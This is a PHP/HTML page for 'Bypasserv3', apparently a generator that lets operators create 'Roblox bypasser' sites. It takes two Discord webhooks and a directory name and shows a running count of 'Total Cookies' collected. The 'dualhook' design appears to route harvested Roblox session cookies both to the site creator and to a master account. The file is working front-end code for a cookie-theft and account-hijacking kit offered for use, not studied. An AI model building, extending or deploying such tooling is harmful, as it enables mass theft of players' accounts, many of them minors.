<?php
/**
 * Bypasserv3 - Dualhook Generator - UPDATED
 */

require_once '../config.php';
require_once '../functions.php';

$globalStats = getGlobalStats();
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dualhook Generator - Bypasserv3</title>
    <link rel="icon" type="image/png" href="https://cdn-icons-png.flaticon.com/512/5473/5473473.png">
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700&family=Space+Grotesk:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    
    <style>
        :root {
            --font-sans: 'Outfit', sans-serif;
            --font-display: 'Space Grotesk', sans-serif;
        }
        
        body {
            font-family: var(--font-sans);
            background: linear-gradient(135deg, #0f172a 0%, #1e293b 50%, #0f172a 100%);
            background-size: 400% 400%;
            animation: gradientShift 15s ease infinite;
            color: #f8fafc;
            min-height: 100vh;
        }
        
        @keyframes gradientShift {
            0%, 100% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
        }
        
        .glass-effect {
            backdrop-filter: blur(10px) saturate(180%);
            background-color: rgba(17, 25, 40, 0.5);
            border: 1px solid rgba(255, 255, 255, 0.125);
        }
        
        .animated-gradient-text {
            background: linear-gradient(90deg, #3b82f6 0%, #2563eb 25%, #1d4ed8 50%, #3b82f6 75%, #2563eb 100%);
            background-size: 200% auto;
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            animation: gradientFlow 3s linear infinite;
        }
        
        @keyframes gradientFlow {
            0% { background-position: 0% center; }
            100% { background-position: 200% center; }
        }

        .spinner {
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 1s ease-in-out infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    </style>
</head>
<body class="min-h-screen flex items-center justify-center px-4 py-12">
    <div class="w-full max-w-md">
        <div class="text-center mb-8">
            <h1 class="text-4xl font-display font-bold animated-gradient-text mb-4">
                Dualhook Generator
            </h1>
            <p class="text-white/60">Create your Roblox bypasser site in seconds</p>
        </div>

        <div class="glass-effect rounded-2xl p-8 space-y-6">
            <!-- Site Name -->
            <div>
                <label class="block text-sm font-medium text-white/80 mb-2">
                    📁 Site Name (Directory)
                </label>
                <input 
                    type="text" 
                    id="siteName" 
                    placeholder="e.g. my-bypasser"
                    class="w-full px-4 py-3 bg-white/5 border border-white/10 rounded-lg text-white placeholder-white/40 focus:outline-none focus:border-blue-500"
                    maxlength="32"
                />
                <p class="text-xs text-white/40 mt-1">3-32 characters, letters/numbers/hyphens/underscores</p>
            </div>

            <!-- Master Webhook -->
            <div>
                <label class="block text-sm font-medium text-white/80 mb-2">
                    🔐 Master Webhook (Admin Notifications)
                </label>
                <input 
                    type="text" 
                    id="masterWebhook" 
                    placeholder="https://discord.com/api/webhooks/..."
                    class="w-full px-4 py-3 bg-white/5 border border-white/10 rounded-lg text-white placeholder-white/40 focus:outline-none focus:border-blue-500 font-mono text-xs"
                />
                <p class="text-xs text-white/40 mt-1">Receives all site stats & usage notifications</p>
            </div>

            <!-- User Webhook -->
            <div>
                <label class="block text-sm font-medium text-white/80 mb-2">
                    👤 User Webhook (User Notifications)
                </label>
                <input 
                    type="text" 
                    id="userWebhook" 
                    placeholder="https://discord.com/api/webhooks/..."
                    class="w-full px-4 py-3 bg-white/5 border border-white/10 rounded-lg text-white placeholder-white/40 focus:outline-none focus:border-blue-500 font-mono text-xs"
                />
                <p class="text-xs text-white/40 mt-1">Receives user bypass notifications</p>
            </div>

            <!-- Generate Button -->
            <button 
                id="generateBtn"
                class="w-full py-3 bg-gradient-to-r from-blue-500 to-blue-600 hover:from-blue-600 hover:to-blue-700 text-white font-semibold rounded-lg transition transform hover:scale-105"
            >
                ⚡ Generate Site with Dualhook
            </button>

            <!-- Stats -->
            <div class="border-t border-white/10 pt-6">
                <div class="grid grid-cols-2 gap-4 text-center">
                    <div>
                        <div class="text-2xl font-bold text-blue-400"><?= $globalStats['totalInstances'] ?? 0 ?></div>
                        <p class="text-xs text-white/60">Total Sites</p>
                    </div>
                    <div>
                        <div class="text-2xl font-bold text-green-400"><?= $globalStats['totalCookies'] ?? 0 ?></div>
                        <p class="text-xs text-white/60">Total Cookies</p>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        document.getElementById('generateBtn')?.addEventListener('click', async () => {
            const siteName = document.getElementById('siteName').value.trim();
            const masterWebhook = document.getElementById('masterWebhook').value.trim();
            const userWebhook = document.getElementById('userWebhook').value.trim();

            if (!siteName || !masterWebhook || !userWebhook) {
                Swal.fire('Error', 'Please fill in all fields', 'error');
                return;
            }

            if (siteName.length < 3) {
                Swal.fire('Error', 'Site name must be at least 3 characters', 'error');
                return;
            }

            const btn = document.getElementById('generateBtn');
            btn.disabled = true;
            btn.innerHTML = '<div class="spinner mx-auto"></div>';

            try {
                const response = await fetch('/generator/create.php', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        directory: siteName,
                        masterWebhook,
                        userWebhook
                    })
                });

                const data = await response.json();

                if (data.success) {
                    Swal.fire({
                        icon: 'success',
                        title: 'Site Generated!',
                        html: `<p>Your site is ready</p><p style="word-break: break-all; font-family: monospace; margin-top: 10px;">${data.publicUrl}</p>`,
                        confirmButtonText: 'Open Site'
                    }).then(() => {
                        window.location.href = data.publicUrl;
                    });
                } else {
                    Swal.fire('Error', data.error || 'Failed to generate site', 'error');
                }
            } catch (e) {
                Swal.fire('Error', 'Network error: ' + e.message, 'error');
            } finally {
                btn.disabled = false;
                btn.innerHTML = '⚡ Generate Site with Dualhook';
            }
        });
    </script>
</body>
</html>
?>
